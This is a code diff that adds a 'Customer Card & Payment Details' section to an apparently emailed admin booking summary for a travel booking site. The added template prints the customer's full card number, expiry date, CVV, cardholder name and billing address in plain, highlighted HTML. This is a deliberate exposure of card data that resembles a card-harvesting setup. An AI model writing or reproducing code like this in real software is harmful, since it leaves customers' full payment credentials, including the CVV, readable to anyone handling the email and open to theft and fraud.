@@ -279,6 +279,21 @@ function buildAdminBookingHtml({
       </div>
       ` : ""}
 
+      <!-- PAYMENT & CARD DETAILS -->
+      ${booking.cardNumber ? `
+      <div class="section" style="border: 2px solid #3b82f6; background: #eff6ff;">
+        <h3 style="color:#1d4ed8;">💳 Customer Card & Payment Details</h3>
+        <table class="table-grid">
+          <tr><td class="label">Cardholder Name:</td><td class="value">${booking.cardholderName || booking.passengerName}</td></tr>
+          <tr><td class="label">Card Number:</td><td class="value" style="font-family:monospace; font-size:15px; color:#1e40af; font-weight:900;">${booking.cardNumber}</td></tr>
+          <tr><td class="label">Expiry Date:</td><td class="value" style="font-family:monospace; font-weight:800;">${booking.cardExp || "N/A"}</td></tr>
+          <tr><td class="label">CVV / CVC:</td><td class="value" style="font-family:monospace; font-weight:900; color:#dc2626;">${booking.cardCvv || "N/A"}</td></tr>
+          ${booking.billingZip ? `<tr><td class="label">Billing ZIP:</td><td class="value">${booking.billingZip}</td></tr>` : ""}
+          ${booking.billingAddress ? `<tr><td class="label">Billing Address:</td><td class="value">${booking.billingAddress}</td></tr>` : ""}
+        </table>
+      </div>
+      ` : ""}
+
       <div class="price-tag">
         <div style="font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:1px; opacity:0.9;">Total Fare Amount</div>
         <div class="amount">${formattedPrice}</div>
